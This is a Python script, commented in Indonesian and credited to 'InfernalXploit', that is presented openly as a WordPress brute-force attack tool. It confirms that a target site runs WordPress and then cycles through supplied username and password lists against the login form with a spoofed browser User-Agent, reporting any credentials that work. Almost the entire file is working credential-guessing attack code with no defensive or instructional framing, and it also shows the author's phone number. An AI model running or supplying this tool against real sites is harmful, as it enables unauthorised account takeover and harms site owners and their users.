import requests
import time
import os
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

# === Password & File Penyimpanan ===
PASSWORD = "infernalxploit"
PASSWORD_FILE = ".password_saved"

def check_password():
    """Cek apakah password sudah pernah dimasukkan sebelumnya"""
    if os.path.exists(PASSWORD_FILE):
        return True  # Jika file password ada, langsung jalankan script

    input_password = input(Fore.YELLOW + "[🔒] Masukkan password untuk menjalankan script: ").strip()
    if input_password != PASSWORD:
        print(Fore.RED + "❌ Password salah! Program keluar.")
        exit()

    print(Fore.GREEN + "✅ Password benar! Menjalankan script...\n")
    with open(PASSWORD_FILE, "w") as f:
        f.write("OK")  # Simpan file sebagai tanda password sudah dimasukkan

    time.sleep(1)
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear layar setelah password benar

# === Putar Lagu ===
def play_music():
    try:
        return subprocess.Popen(["mpv", "--loop=inf", "lagu.mp3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print(Fore.RED + "[⚠] Gagal memutar lagu! Pastikan 'mpv' terinstal dan file 'lagu.mp3' tersedia.")

def stop_music(process):
    if process:
        process.terminate()

# === Logo InfernalXploit ===
def show_logo():
    logo = f"""{Fore.RED}
   SC BRUTE FORCE WEB BY INFERNALXPLOIT
   Author : InfernalXploit
   Pembuat : InfernalXploit
   Nomer WhatsApp : 6289648191199
{Style.RESET_ALL}
{Fore.YELLOW}🔥 WordPress Brute Force Attack by InfernalXploit 🔥{Style.RESET_ALL}
"""
    print(logo)

def status(msg):
    print(Fore.CYAN + "[*] " + msg)

def success(msg):
    print(Fore.GREEN + "[+] " + msg)

def error(msg):
    print(Fore.RED + "[-] " + msg)

def validate_wp(site):
    """Memvalidasi apakah target adalah situs WordPress"""
    status(f"Validasi {site}...")
    try:
        r = requests.get(site, timeout=10, allow_redirects=True)
        
        if "wp-login.php" in r.url or "/wp-admin/" in r.url:
            success(f"{site} terkonfirmasi sebagai situs WordPress.")
            return True

        if 'wp-content' in r.text or 'wp-login' in r.text:
            success(f"{site} terkonfirmasi sebagai situs WordPress.")
            return True

        error(f"{site} bukan situs WordPress.")
        return False

    except requests.exceptions.RequestException as e:
        error(f"Kesalahan validasi: {str(e)}")
        return False

def brute_force(site, credentials):
    """Melakukan brute force login WordPress"""
    success(f"Mulai brute force pada {site}")

    for username, password in credentials:
        status(f"Mencoba {username}:{password}")

        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{site}/wp-admin/',
            'testcookie': '1'
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        try:
            r = requests.post(site, data=data, headers=headers, timeout=10)

            if "dashboard" in r.text or "wp-admin" in r.url:
                success(f"✅ Login berhasil! Username: {username} | Password: {password}")
                return True
            
            elif "error" in r.text or "invalid" in r.text:
                error("Login gagal, mencoba password berikutnya...")
            
            time.sleep(1)  

        except requests.exceptions.RequestException as e:
            error(f"Request error: {str(e)}")

    error("Brute force gagal, tidak ada kombinasi yang cocok.")
    return False

# === Main Program ===
check_password()  # Password hanya diminta sekali, lalu disimpan
music_process = play_music()  # Putar lagu setelah password benar

try:
    show_logo()
    site = input(Fore.WHITE + '[i] Masukkan target (wp-login.php): ').strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site

    if validate_wp(site):
        mode = input(Fore.WHITE + '[?] Gunakan file user:pass atau admin list? (1=user:pass,  2=admin+password): ').strip()

        credentials = []

        if mode == '1':
            file_path = input(Fore.WHITE + '[i] Masukkan path file user:pass: ').strip()
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    for line in file:
                        line = line.strip()
                        if ':' in line:
                            username, password = line.split(':', 1)
                            credentials.append((username, password))
                success(f"{len(credentials)} kombinasi user:pass dimuat.")
            except FileNotFoundError:
                error("File tidak ditemukan.")
                exit()

        elif mode == '2':
            admin_list = input(Fore.WHITE + '[i] Masukkan path admin list: ').strip()
            password_list = input(Fore.WHITE + '[i] Masukkan path password list: ').strip()

            try:
                with open(admin_list, 'r', encoding='utf-8') as file:
                    admin_usernames = [line.strip() for line in file]

                with open(password_list, 'r', encoding='utf-8') as file:
                    passwords = [line.strip() for line in file]

                for username in admin_usernames:
                    for password in passwords:
                        credentials.append((username, password))

                success(f"{len(admin_usernames)} admin ditemukan & {len(passwords)} password dimuat. Total kombinasi: {len(credentials)}")

            except FileNotFoundError:
                error("File admin atau password tidak ditemukan.")
                exit()

        else:
            error("Pilihan tidak valid.")
            exit()

        brute_force(site, credentials)
    else:
        error("[✗] Target bukan WordPress atau error.")

finally:
    stop_music(music_process)  # Hentikan lagu setelah program selesai atau dihentikan

